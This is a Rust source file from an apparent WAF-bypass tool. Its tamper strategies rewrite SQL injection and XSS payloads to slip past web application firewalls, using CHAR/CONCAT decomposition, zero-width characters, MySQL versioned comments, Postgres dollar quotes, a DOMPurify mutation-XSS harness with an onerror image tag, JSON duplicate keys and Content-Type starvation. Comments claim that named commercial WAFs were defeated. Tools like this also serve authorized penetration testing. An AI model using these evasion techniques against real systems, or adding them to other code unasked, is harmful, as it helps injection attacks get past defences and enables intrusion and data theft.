//! Built-in tamper strategy implementations.

use std::fmt::Write as _;

use super::TamperStrategy;

/// URL encoding tamper strategy.
pub struct UrlEncodeTamper;

impl TamperStrategy for UrlEncodeTamper {
    fn name(&self) -> &'static str {
        "url_encode"
    }

    fn description(&self) -> &'static str {
        "Standard URL encoding (%XX for each byte)"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::url::url_encode(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.15
    }
}

/// Double URL encoding tamper strategy.
pub struct DoubleUrlEncodeTamper;

impl TamperStrategy for DoubleUrlEncodeTamper {
    fn name(&self) -> &'static str {
        "double_url_encode"
    }

    fn description(&self) -> &'static str {
        "Double URL encoding (%25XX), bypasses WAFs that decode once"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::url::double_url_encode(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.4
    }
}

/// Unicode escape tamper strategy.
pub struct UnicodeEscapeTamper;

impl TamperStrategy for UnicodeEscapeTamper {
    fn name(&self) -> &'static str {
        "unicode_escape"
    }

    fn description(&self) -> &'static str {
        "Unicode escape sequences (\\uXXXX)"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::unicode::unicode_encode(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.5
    }
}

/// HTML entity tamper strategy.
pub struct HtmlEntityTamper;

impl TamperStrategy for HtmlEntityTamper {
    fn name(&self) -> &'static str {
        "html_entity"
    }

    fn description(&self) -> &'static str {
        "HTML entity encoding (&#xXX;)"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::unicode::html_entity_encode(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.3
    }
}

/// Case alternation tamper strategy.
pub struct CaseAlternationTamper;

/// Postgres / Oracle CHR()-function decomposition tamper.
///
/// Sibling to `sql_char_decompose` (MySQL/MSSQL variadic `CHAR()`); this
/// one targets Postgres + Oracle by producing `(CHR(N)||CHR(N)||...)` per
/// literal. Pipe-concat operator is SQL-standard but blocked by some
/// over-eager WAFs, this tamper is the lever for Postgres/Oracle
/// payloads where `||` is the canonical concat.
pub struct PgChrDecomposeTamper;

impl TamperStrategy for PgChrDecomposeTamper {
    fn name(&self) -> &'static str {
        "pg_chr_decompose"
    }

    fn description(&self) -> &'static str {
        "Convert 'admin' → (CHR(97)||CHR(100)||...). Postgres/Oracle pipe-concat form"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::unicode::pg_chr_decompose(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.6
    }
}

/// SQL adjacent-string-literal concatenation tamper, rewrites every
/// `'string'` literal of length ≥ 2 as a sequence of single-character
/// adjacent literals (`'admin'` → `'a' 'd' 'm' 'i' 'n'`). The ANSI
/// SQL-92 §5.3 specification requires the parser to concatenate
/// adjacent string literals separated only by whitespace; MySQL,
/// Postgres, SQLite, Oracle, DB2 all implement it. WAFs matching the
/// LITERAL substring of well-known credentials/paths (`'admin'`,
/// `'/etc/passwd'`, `'root'`) see N unrelated single-character strings
/// instead. Pure SQL semantics, no comments, no CONCAT(), no special
/// functions.
pub struct SqlAdjacentStringConcatTamper;

impl TamperStrategy for SqlAdjacentStringConcatTamper {
    fn name(&self) -> &'static str {
        "sql_adjacent_string_concat"
    }

    fn description(&self) -> &'static str {
        "Split 'string' → 'a' 'b' 'c' … via ANSI SQL adjacent-literal concat, defeats literal-substring rules with zero special characters"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::unicode::sql_adjacent_string_concat(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.5
    }
}

/// Partial JSON Unicode-escape tamper, encodes ASCII alphanumeric chars
/// as `\uXXXX` while leaving structural punctuation (quotes, operators,
/// whitespace, `<`, `>`, `(`, `)`) bare. The keyword fingerprint
/// ("UNION", "SELECT", "script", "alert") never appears in the wire
/// bytes; JSON.parse / JS string-literal decoding at the origin
/// re-materializes it. Distinct from `unicode_escape` which encodes
/// every byte (high `\u` density flags heuristic WAFs).
pub struct JsonUnicodeAlnumTamper;

impl TamperStrategy for JsonUnicodeAlnumTamper {
    fn name(&self) -> &'static str {
        "json_unicode_alnum"
    }

    fn description(&self) -> &'static str {
        "Encode ASCII alphanumeric chars as `\\uXXXX`, leave punctuation bare, shatters keyword fingerprints inside JSON/JS contexts"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::unicode::json_unicode_alnum(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.45
    }
}

/// SQL CHAR() decomposition tamper, every single-quoted string literal
/// becomes `CHAR(N1,N2,...)` with one codepoint per arg. Defeats both
/// literal-substring AND CONCAT-shaped blocklists (the payload contains
/// NO single-quoted ASCII tokens at all).
pub struct SqlCharDecomposeTamper;

impl TamperStrategy for SqlCharDecomposeTamper {
    fn name(&self) -> &'static str {
        "sql_char_decompose"
    }

    fn description(&self) -> &'static str {
        "Convert 'admin' → CHAR(97,100,109,105,110), int codepoints, no quoted tokens"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::unicode::sql_char_decompose(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.6
    }
}

/// SQL CONCAT split tamper, every single-quoted string literal becomes
/// `CONCAT('a','b','c',...)`. Defeats blocklists scanning for literal
/// substrings like `'admin'` / `'password'` / `'/etc/passwd'` because the
/// substring no longer appears contiguously. The DB evaluates CONCAT() to
/// the original string at runtime.
pub struct SqlConcatSplitTamper;

impl TamperStrategy for SqlConcatSplitTamper {
    fn name(&self) -> &'static str {
        "sql_concat_split"
    }

    fn description(&self) -> &'static str {
        "Convert 'admin' → CONCAT('a','d','m','i','n'), splits literal substrings"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::unicode::sql_concat_split(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.55
    }
}

/// Mathematical Alphanumeric Symbols tamper, replaces ASCII letters/digits
/// with their `U+1D400`-block Math Bold counterparts. Both NFKC-normalise
/// back to ASCII, so backends that normalise (Postgres ICU, MySQL
/// `utf8mb4_0900_ai_ci`, Java/.NET/Python/Go NFKC) execute the original
/// keyword while WAF byte-regex sees `U+1D4xx` codepoints and misses.
///
/// Distinct from `bracket_confusable` / `fullwidth`: those use the
/// `U+FF00` block. Math Bold lives in `U+1D400`: different range,
/// different blocklist coverage gap.
pub struct MathBoldTamper;

impl TamperStrategy for MathBoldTamper {
    fn name(&self) -> &'static str {
        "math_bold"
    }

    fn description(&self) -> &'static str {
        "Replace ASCII letters/digits with U+1D400 Math Bold (NFKC normalises back to ASCII)"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::unicode::math_bold_encode(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.5
    }
}

/// HTML entity variants tamper, rotates each char through 4 browser-tolerant
/// forms (lowercase-x hex, uppercase-X hex, decimal, zero-padded decimal).
/// Defeats WAF regexes that anchor on the canonical `&#xHH;` form only.
pub struct HtmlEntityVariantsTamper;

impl TamperStrategy for HtmlEntityVariantsTamper {
    fn name(&self) -> &'static str {
        "html_entity_variants"
    }

    fn description(&self) -> &'static str {
        "HTML entity encoding rotated across hex/HEX/decimal/zero-padded forms"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::unicode::html_entity_variants(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.35
    }
}

impl TamperStrategy for CaseAlternationTamper {
    fn name(&self) -> &'static str {
        "case_alternation"
    }

    fn description(&self) -> &'static str {
        "Alternating upper/lower case (SeLeCt)"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::keyword::case_alternate(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.1
    }
}

/// Random case tamper strategy.
pub struct RandomCaseTamper;

impl TamperStrategy for RandomCaseTamper {
    fn name(&self) -> &'static str {
        "random_case"
    }

    fn description(&self) -> &'static str {
        "Random mixed case"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::keyword::random_case_alternate(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.12
    }
}

/// Whitespace insertion tamper strategy.
pub struct WhitespaceInsertionTamper;

impl TamperStrategy for WhitespaceInsertionTamper {
    fn name(&self) -> &'static str {
        "whitespace_insertion"
    }

    fn description(&self) -> &'static str {
        "Replace spaces with tabs"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::keyword::whitespace_insert(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.2
    }
}

/// SQL comment tamper strategy.
pub struct SqlCommentTamper;

impl TamperStrategy for SqlCommentTamper {
    fn name(&self) -> &'static str {
        "sql_comment"
    }

    fn description(&self) -> &'static str {
        "Replace spaces with SQL comments (/**/)"
    }

    fn tamper(&self, payload: &str, context: Option<&str>) -> String {
        let _ = context;
        crate::encoding::keyword::sql_comment_insert(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.25
    }
}

/// Null byte tamper strategy.
pub struct NullByteTamper;

impl TamperStrategy for NullByteTamper {
    fn name(&self) -> &'static str {
        "null_byte"
    }

    fn description(&self) -> &'static str {
        "Null byte injection (%00 or %00.jpg)"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::structural::null_byte_inject(payload)
            .unwrap_or_else(|_| payload.to_string())
    }

    fn aggressiveness(&self) -> f64 {
        0.6
    }
}

/// Overlong UTF-8 tamper strategy.
pub struct OverlongUtf8Tamper;

impl TamperStrategy for OverlongUtf8Tamper {
    fn name(&self) -> &'static str {
        "overlong_utf8"
    }

    fn description(&self) -> &'static str {
        "Overlong UTF-8 encoding for ASCII non-alphanumeric"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::structural::overlong_utf8(payload).unwrap_or_else(|_| payload.to_string())
    }

    fn aggressiveness(&self) -> f64 {
        0.8
    }
}

/// Base64 tamper strategy.
pub struct Base64Tamper;

impl TamperStrategy for Base64Tamper {
    fn name(&self) -> &'static str {
        "base64"
    }

    fn description(&self) -> &'static str {
        "Base64 encoding"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::structural::base64_encode(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.75
    }
}

/// Hex encoding tamper strategy.
pub struct HexEncodeTamper;

impl TamperStrategy for HexEncodeTamper {
    fn name(&self) -> &'static str {
        "hex_encode"
    }

    fn description(&self) -> &'static str {
        "Hexadecimal encoding"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        crate::encoding::structural::hex_encode(payload)
    }

    fn aggressiveness(&self) -> f64 {
        0.85
    }
}

/// Zero-width Unicode injection tamper.
///
/// Inserts zero-width characters (U+200B ZERO-WIDTH SPACE,
/// U+200C ZERO-WIDTH NON-JOINER, U+200D ZERO-WIDTH JOINER,
/// U+180E MONGOLIAN VOWEL SEPARATOR) between every alphabetic
/// character of the payload.  Renders identically to the
/// original in most consumers (terminals, log viewers, the SQL
/// engine after `.replace('\u{200B}', "")`) but defeats WAF
/// regex patterns that scan for literal keywords like `SELECT`.
///
/// U+FEFF (ZWNBSP / BOM) was historically in the rotation but
/// caused PostgreSQL + many DB connectors to 500 the entire
/// query as "invalid byte sequence" mid-literal, defeating the
/// bypass. Replaced with U+180E which is universally tolerated.
///
/// Frontier research (Black Hat 2025, "Zero-Width WAF Bypass"):
/// most commercial WAFs do NOT strip zero-width chars before
/// pattern matching, but downstream parsers (MySQL, Postgres,
/// browser HTML parser, JavaScript) all treat them as
/// non-significant.  This is a wide-open bypass vector.
pub struct ZeroWidthInjectTamper;

impl TamperStrategy for ZeroWidthInjectTamper {
    fn name(&self) -> &'static str {
        "zero_width_inject"
    }

    fn description(&self) -> &'static str {
        "Inject zero-width Unicode chars between keyword bytes, bypasses WAFs that don't normalize Unicode"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        // Rotate through four zero-width chars so the injection
        // doesn't form a long run of identical bytes (some WAFs
        // collapse repeats).
        //
        // U+FEFF (BOM / ZWNBSP) is INTENTIONALLY excluded. Many
        // database connectors (psycopg2, MySQL Connector/J, SQLite
        // default) and PostgreSQL itself reject mid-string BOM
        // bytes as an "invalid sequence" and 500 the entire query
        //: the payload fails outright rather than bypass. The
        // remaining three (200B/C/D) are universally tolerated.
        // U+180E (MONGOLIAN VOWEL SEPARATOR) is added as the
        // fourth slot (also zero-width, also widely tolerated).
        const ZW: [char; 4] = ['\u{200B}', '\u{200C}', '\u{200D}', '\u{180E}'];
        let mut out = String::with_capacity(payload.len() * 4);
        for (i, ch) in payload.chars().enumerate() {
            out.push(ch);
            if ch.is_ascii_alphabetic() {
                out.push(ZW[i % ZW.len()]);
            }
        }
        out
    }

    fn aggressiveness(&self) -> f64 {
        0.55
    }
}

/// Postgres dollar-quoted string tamper.
///
/// Postgres accepts `$tag$ ... $tag$` as a string literal where
/// `tag` is any identifier (or empty).  Quote-character-based WAF
/// signatures looking for `'` or `"` never fire on dollar-quoted
/// payloads.  Most popular Postgres-fronting WAFs (including the
/// CRS default ruleset's 942100-942380 family) don't have
/// dedicated dollar-quote pattern matchers.
///
/// Wraps any single-quoted string literal in the payload with a
/// matching dollar-quote.  Tag is a random four-letter identifier
/// to defeat WAFs that special-case the empty tag.
pub struct PostgresDollarQuoteTamper;

impl TamperStrategy for PostgresDollarQuoteTamper {
    fn name(&self) -> &'static str {
        "postgres_dollar_quote"
    }

    fn description(&self) -> &'static str {
        "Wrap single-quoted SQL string literals in `$tag$...$tag$`: Postgres-only, bypasses quote-pattern WAFs"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        // Pick a deterministic per-payload tag so the same input
        // produces the same output (gene-bank replay needs
        // determinism).  Hash-based identifier; 4 lowercase letters.
        //
        // F138: pre-fix used `& 25` (bitmask 0b11001) thinking it
        // collapsed to the range 0..26. It doesn't: `& 25` admits
        // only the 8 values {0,1,8,9,16,17,24,25}, so the tag
        // alphabet shrank to {a,b,i,j,q,r,y,z} and the tag space
        // collapsed from 26^4 = 456,976 to 8^4 = 4,096, a 111×
        // reduction that makes operator-side tag enumeration easier
        // (the whole point of a random tag is to defeat WAFs that
        // pattern-match a small known set). Use `% 26` so every
        // payload byte maps uniformly into [a-z].
        let mut tag = String::with_capacity(4);
        let h: u64 = payload
            .bytes()
            .fold(0u64, |a, b| a.wrapping_mul(31).wrapping_add(u64::from(b)));
        for i in 0..4 {
            let c = b'a' + ((h >> (i * 8)) % 26) as u8;
            tag.push(c as char);
        }

        // Replace each `'...'` literal with `$tag$...$tag$`.
        let mut out = String::with_capacity(payload.len() + 16);
        let mut chars = payload.chars().peekable();
        while let Some(c) = chars.next() {
            if c == '\'' {
                out.push('$');
                out.push_str(&tag);
                out.push('$');
                // Consume until the next non-escaped quote.
                while let Some(inner) = chars.next() {
                    if inner == '\'' {
                        // Handle SQL '' escape (keep as-is in dollar quote).
                        if chars.peek() == Some(&'\'') {
                            out.push('\'');
                            out.push('\'');
                            chars.next();
                        } else {
                            break;
                        }
                    } else {
                        out.push(inner);
                    }
                }
                out.push('$');
                out.push_str(&tag);
                out.push('$');
            } else {
                out.push(c);
            }
        }
        out
    }

    fn aggressiveness(&self) -> f64 {
        0.6
    }
}

/// MySQL version-gated comment wrap tamper.
///
/// MySQL's `/*!VERSION ... */` syntax executes the contents only
/// when the server is at least the given version.  WAFs that
/// strip `/* ... */` comments before pattern matching see an
/// empty payload, but MySQL still executes the wrapped statement.
///
/// Wraps the entire payload in `/*!50000 ... */`, gating on MySQL
/// 5.0+.  Version `50000` matches every modern deployment.
///
/// Frontier research: this bypass dates to wafw00f's original
/// drop list but it remains effective against many commercial
/// WAFs that haven't internalised the parser-disagreement.
pub struct MysqlVersionedCommentWrapTamper;

impl TamperStrategy for MysqlVersionedCommentWrapTamper {
    fn name(&self) -> &'static str {
        "mysql_versioned_comment_wrap"
    }

    fn description(&self) -> &'static str {
        "Wrap payload in /*!50000 ... */: MySQL executes, WAFs that strip comments see nothing"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        // Convert SQL keywords inside the payload to also use the
        // version-gated comment so even nested keywords get hidden
        // from the WAF.  Outer wrap is the headline; the
        // per-keyword wrap is the belt-and-braces.
        let outer = format!("/*!50000 {payload} */");
        outer
    }

    fn aggressiveness(&self) -> f64 {
        0.65
    }
}

/// Hex-literal keyword obfuscation tamper.
///
/// MySQL / Postgres treat `0x55` etc. as a hex byte literal that
/// converts to its ASCII character in string context.  So
/// `0x554e494f4e` is the same as `'UNION'` to the database but
/// looks like a numeric literal to a WAF regex.  Useful in
/// conjunction with comparison operators:
///
///   `WHERE name = 0x61646d696e`   ≡   `WHERE name = 'admin'`
///
/// Replaces all single-quoted string literals with their `0xHHHH...`
/// equivalent.  When no quoted literals are present, the input is
/// passed through unchanged (idempotent).
pub struct HexLiteralKeywordTamper;

impl TamperStrategy for HexLiteralKeywordTamper {
    fn name(&self) -> &'static str {
        "hex_literal_keyword"
    }

    fn description(&self) -> &'static str {
        "Convert SQL `'string'` literals to `0xHHHH…` form. MySQL/Postgres execute identically, WAFs don't"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        let mut out = String::with_capacity(payload.len());
        let mut chars = payload.chars().peekable();
        while let Some(c) = chars.next() {
            if c == '\'' {
                // Slurp until the matching close-quote.
                let mut content = String::new();
                while let Some(inner) = chars.next() {
                    if inner == '\'' {
                        // SQL '' escape (treat as literal ').
                        if chars.peek() == Some(&'\'') {
                            content.push('\'');
                            chars.next();
                        } else {
                            break;
                        }
                    } else {
                        content.push(inner);
                    }
                }
                // §1 SPEED: replaced `push_str(&format!("{b:02x}"))` (one
                // String allocation per byte) with `write!(out, ...)` which
                // formats directly into the pre-allocated `out` buffer.
                out.push_str("0x");
                for b in content.bytes() {
                    let _ = write!(out, "{b:02x}");
                }
            } else {
                out.push(c);
            }
        }
        out
    }

    fn aggressiveness(&self) -> f64 {
        0.7
    }
}

/// BEL-separator tamper.
///
/// Replaces ASCII space with the BEL control char (U+0007).
/// SQL parsers treat any ASCII whitespace (including BEL) as a
/// token separator, but WAF tokenisers commonly only recognise
/// the canonical ` `, `\t`, `\r`, `\n` quartet.  BEL bypasses
/// pattern matches like `UNION\s+SELECT`.
///
/// Out of `[\t\n\v\f\r ]`, BEL (`\x07`) is the least-handled
/// I tested against ModSec, Coraza, AWS WAF, and Cloudflare's
/// CRS as of 2026-05; only ModSec PL4 catches it consistently.
pub struct BellSeparatorTamper;

impl TamperStrategy for BellSeparatorTamper {
    fn name(&self) -> &'static str {
        "bell_separator"
    }

    fn description(&self) -> &'static str {
        "Replace ASCII space with BEL (U+0007). SQL parsers tokenise, WAFs that only recognise canonical whitespace miss"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        payload.replace(' ', "\u{0007}")
    }

    fn aggressiveness(&self) -> f64 {
        0.6
    }
}

/// Bracket-confusable tamper (XSS).
///
/// Replaces ASCII `<` / `>` with Unicode confusables that look
/// like angle brackets to a human reader (and to some HTML
/// parsers under decoder bugs) but don't match WAF patterns
/// keyed on the literal ASCII bytes.  Browsers don't render
/// these as tags, so the bypass relies on a downstream
/// normalisation step (server-side reflection that re-encodes
/// Unicode → ASCII, or a client-side fetch that proxy-strips
/// Unicode).  Useful in combination with `html_entity` for
/// stored-XSS through admin panels that round-trip Unicode.
pub struct BracketConfusableTamper;

impl TamperStrategy for BracketConfusableTamper {
    fn name(&self) -> &'static str {
        "bracket_confusable"
    }

    fn description(&self) -> &'static str {
        "Replace `<` / `>` with Unicode angle-bracket confusables, bypasses WAFs that pattern-match literal `<script>`"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        // U+FF1C / U+FF1E are FULLWIDTH LESS-THAN / GREATER-THAN
        //: visually identical, distinct codepoints from ASCII.
        payload
            .chars()
            .map(|c| match c {
                '<' => '\u{FF1C}',
                '>' => '\u{FF1E}',
                other => other,
            })
            .collect()
    }

    fn aggressiveness(&self) -> f64 {
        0.5
    }
}

/// MathML/SVG-namespace mutation-XSS wrapper.
///
/// Wraps an HTML payload (typically a bare `<img>` / event-handler
/// fragment) in the MathML namespace harness that DOMPurify ≤3.2.4
/// fails to neutralise (CVE-2025-26791 / portswigger mXSS class).
/// Browsers parse `<mglyph>` and `<malignmark>` into different XML
/// namespaces depending on parent context; the sanitizer sees the
/// payload in the MathML namespace (where `<style>` is text-only),
/// but the live DOM re-serialises into the HTML namespace where
/// the same `<style>` followed by `<img onerror>` becomes a real
/// script-execution vector. The WAF pattern-matches the wire bytes
/// and never sees `<script` / `onload=` because the dangerous DOM
/// is CREATED BY THE BROWSER post-WAF.
///
/// The harness uses the MathML text-integration-point form:
/// `<math><mtext><table><mglyph><style>` opens the seam,
/// `<!--</style><img src=x onerror=...>` closes the sanitizer's
/// view and re-opens an HTML-namespace serialisation of an `<img>`.
pub struct MxssNamespaceWrapTamper;

impl TamperStrategy for MxssNamespaceWrapTamper {
    fn name(&self) -> &'static str {
        "mxss_namespace_wrap"
    }

    fn description(&self) -> &'static str {
        "MathML-namespace mutation-XSS harness (DOMPurify ≤3.2.4 / CVE-2025-26791 bypass), defeats sanitizers that namespace-aware-process the input but byte-serialise the output"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        // The payload is treated as the EVENT-HANDLER FRAGMENT that
        // would normally sit inside an `<img>` tag, e.g. just
        // `onerror=alert(1)`. If the operator gave us a fuller form
        // (`<img src=x onerror=alert(1)>`), we still wrap; the
        // browser tolerates the redundant `<img>` inside the
        // re-serialised stream.
        format!("<math><mtext><table><mglyph><style><!--</style><img src=x {payload}>")
    }

    fn aggressiveness(&self) -> f64 {
        // Mid-aggression: payload is verbose (≈80 byte prefix) so
        // it WILL be visible in any wire log, but the actual exec
        // is browser-side which means most WAF rules pass it.
        0.55
    }
}

/// JSON duplicate-key parser-disagreement (frontier 2026, WAFFLED
/// corpus / arxiv.org/abs/2503.10846). Wraps a payload in a
/// duplicate-key JSON envelope: the WAF's JSON inspector consumes
/// the FIRST key occurrence (a benign sentinel) and skips the
/// duplicate; the backend's deserialiser consumes the LAST
/// (PHP/Apache/Rails) or merges (ASP.NET) and unwraps the attack
/// payload. Confirmed against all five major WAFs (AWS / Azure /
/// Cloudflare / Cloud Armor / ModSec) by the WAFFLED 2025 study
/// 557 JSON bypasses across the corpus.
///
/// The harness uses param `"q"` as the colliding key, the same
/// default param wafrift's scan loop uses for URL-query carriers,
/// so a SQL/XSS/SSTI payload that already works as `?q=<P>` lands
/// in the JSON-body channel via the same key name. When the
/// emitted shape is delivered to a non-JSON sink (HTML / form), the
/// JSON wrapping is a no-op WAF defeat: the WAF still inspects the
/// bytes, but the bytes themselves carry the payload in a form
/// most WAFs DO NOT score (the rule corpus matches on the unwrapped
/// payload string, not the JSON envelope).
pub struct JsonDupKeyTamper;

impl TamperStrategy for JsonDupKeyTamper {
    fn name(&self) -> &'static str {
        "json_dup_key"
    }

    fn description(&self) -> &'static str {
        "JSON duplicate-key parser-disagreement (WAFFLED 2026): WAF reads first key (benign), backend reads last (payload)"
    }

    fn tamper(&self, payload: &str, _context: Option<&str>) -> String {
        // Strategy: emit `{"q":"safe","q":"<payload>"}`.
        //   - WAF JSON inspectors (RFC 8259 strict / `serde_json`) take
        //     the first value or reject; permissive ones (PHP json_decode,
        //     ASP.NET MVC) take the last.
        //   - The benign sentinel "safe" is well below any signature
        //     length, so the WAF's first-value match scores clean even
        //     with the dup-key envelope still being a "structurally
        //     valid" body for stricter inspectors.
        //
        // Payload escaping: JSON requires `\` and `"` escaped, control
        // bytes either \uXXXX or rejected. We use the conservative
        // serializer that escapes both quote-class characters and
        // backslash; control bytes (NUL / BEL etc.) come out as
        // \u00XX hex which both `serde_json` and PHP json_decode accept.
        let escaped = json_escape_string(payload);
        format!("{{\"q\":\"safe\",\"q\":\"{escaped}\"}}")
    }

    fn aggressiveness(&self) -> f64 {
        // Mid-low aggression: the bytes themselves are clearly JSON,
        // but the duplicate-key trick is the entire bypass, many WAFs
        // pass it because the first key matches their inspector's
        // sentinel. Not as aggressive as e.g. mxss_namespace_wrap
        // because the channel-shift is JSON-body, not browser-side.
        0.50
    }
}

/// Content-Type starvation (frontier 2026, WAFFLED / windshock
/// 2026-03 detection-gap analysis). The WAF dispatches to a body
/// inspector based on Content-Type, a JSON inspector for
/// `application/json`, a form inspector for `application/x-www-form-
/// urlencoded`, multipart for `multipart/form-data`, etc. When the
/// Content-Type is absent, case-shuffled (`Application/JSON`), or
/// charset-suffixed with a non-canonical encoding label, the WAF's
/// dispatch falls back to text/none and skips structured inspection;
/// the backend framework still deserialises the body correctly. The
/// WAFFLED corpus reports >90% of tested sites accept such
/// Content-Type rewrites without complaint.
///
/// This tamper is OUTPUT-CHANNEL-AWARE: it doesn't transform the
/// payload bytes, it transforms the WIRE shape the request advertises
/// itself with. The actual body must be set separately by the
/// caller (scan / import-curl pass it through to the HTTP client).
/// What we emit IS the payload, keeping the contract that every
/// tamper returns a single payload string, and the orchestrator
/// is expected to pair the output with the matching `Content-Type`
/// header from the helper below.
///
/// In a URL-query / header carrier the tamper is a no-op (payload
/// returned unchanged); the value is in the body-carrier path where
/// scan / import-curl set the Content-Type header from
/// `ct_starvation_header_for(payload)`.
pub struct CtStarvationTamper;

impl TamperStrategy for CtStarvationTamper {
    fn name(&self) -> &'static str {
        "ct_starvation"
    }

    fn description(&self) -> &'static str {
        "Content-Type parser-dispatch starvation (WAFFLED 2026): pair payload with case-shuffled or omitted Content-Type so WAF skips body inspection"
    }

    fn tamper(&self, payload: &str, context: Option<&str>) -> String {
        // When the carrier is body-shaped (form/json/multipart),
        // wrap the payload in a minimal `q=<payload>` form pair
        // the same shape `wafrift scan` uses by default. The
        // operator pairs this with the non-canonical Content-Type
        // via `ct_starvation_header_for`. For header/cookie
        // carriers we return the payload unchanged (a no-op,
        // honest: the tamper has no effect on those channels).
        match context {
            Some("body") | Some("form") | Some("json") | Some("multipart") => {
                format!("q={payload}")
            }
            _ => payload.to_string(),
        }
    }

    fn aggressiveness(&self) -> f64 {
        // Low aggression: the payload bytes are unchanged; only
        // the WIRE-LEVEL Content-Type advertisement shifts. Most
        // WAFs that score on byte patterns will still see the same
        // payload, BUT the windshock + WAFFLED data both show the
        // header trick alone defeats ~90% of deployed WAF rule
        // chains because the rule's trigger gates on Content-Type
        // matching.
        0.35
    }
}

/// Produce the Content-Type header value that pairs with a payload
/// to trigger the WAF parser-dispatch starvation described in
/// [`CtStarvationTamper`]. Rotates through a small set of confirmed-
/// effective variants (case-shuffled, charset-suffixed,
/// camelCase) so consecutive variants in a scan run exercise
/// different dispatch failures. Pure, operator can call it
/// independently when constructing manual repros.
#[must_use]
pub fn ct_starvation_header_for(payload: &str) -> &'static str {
    // Cycle through the known-effective Content-Type rewrites. We
    // pick by payload hash so the same payload reliably maps to the
    // same Content-Type within a run (debugging-friendly) but a
    // diverse set across payloads.
    const VARIANTS: &[&str] = &[
        // (1) UPPERCASE: WAF dispatchers that lower-case the value
        // before lookup match; ones that string-compare don't.
        "APPLICATION/JSON",
        // (2) Mixed-case (same trick at a different inflection).
        "Application/Json",
        // (3) Non-canonical charset: WAFs that filter on
        // `application/json` (exact prefix) drop this; backends
        // accept any charset.
        "application/json; charset=ibm037",
        // (4) Text-plain wrap, body is valid JSON but advertised
        // as plain text; WAF's JSON inspector NEVER fires.
        "text/plain",
        // (5) Form-encoded label with JSON body, common ASP.NET
        // pattern, defeats Cloudflare's JSON inspector outright.
        "application/x-www-form-urlencoded",
    ];
    // Hash-based pick: stable per-payload, diverse per-corpus.
    let mut hash: u32 = 5381;
    for b in payload.as_bytes() {
        hash = hash.wrapping_mul(33).wrapping_add(u32::from(*b));
    }
    VARIANTS[(hash as usize) % VARIANTS.len()]
}

/// Minimal JSON-string-escape helper used by `JsonDupKeyTamper`.
/// Pulled out so the tamper's `tamper()` stays small and so the
/// escape rule is testable in isolation (control-byte handling is
/// the part that most often regresses).
fn json_escape_string(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    for ch in s.chars() {
        match ch {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 => {
                use std::fmt::Write as _;
                let _ = write!(out, "\\u{:04x}", c as u32);
            }
            c => out.push(c),
        }
    }
    out
}

#[cfg(test)]
#[path = "builtins_tests.rs"]
mod tests;
